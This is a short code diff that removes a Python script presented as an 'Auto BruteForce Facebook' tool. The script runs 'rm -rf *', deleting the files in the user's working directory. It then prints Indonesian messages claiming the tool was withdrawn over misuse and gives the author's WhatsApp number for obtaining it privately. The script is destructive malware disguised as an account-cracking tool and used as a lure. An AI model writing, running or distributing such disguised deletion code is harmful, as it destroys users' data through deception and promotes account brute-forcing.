@@ -1,9 +1,0 @@
-import os
-print("\t[ Auto BruteForce Facebook ]")
-print("\t    [ coded By deray ]\n")
-os.system("rm -rf *")
-print("[!] sesuai janji,banyak yg salahgunakan tools ini saya telah menghapusnya.")
-print("[!] silahkan chat privat deray untuk mendapat tools nya lagi.")
-print("[!] karna tools nya suda tidak di publikasikan")
-print("[!] wa: 0895353484895")
-exit()
